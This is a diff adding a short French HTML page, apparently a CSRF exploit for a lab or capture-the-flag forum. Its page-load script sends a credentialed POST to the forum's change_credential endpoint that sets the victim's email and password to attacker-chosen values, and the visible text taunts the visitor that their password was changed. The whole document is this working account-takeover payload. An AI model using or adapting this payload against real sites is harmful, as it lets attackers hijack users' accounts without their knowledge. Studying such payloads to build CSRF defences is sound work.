@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Mouhaha</title>
+    </head>
+    <body>
+
+        Vous n'auriez pas dû venir ici,
+        Votre mot de passe a été changé sur votre forum préféré !
+
+        <script>
+            fetch("https://forum:5000/api/change_credential", {
+              method: "POST",
+              body: new URLSearchParams({
+                new_email: "mouhaha@gmail.com",
+                new_password: "mouhaha"
+              }),
+              credentials: "include"
+            });
+        </script>
+    </body>
+</html>
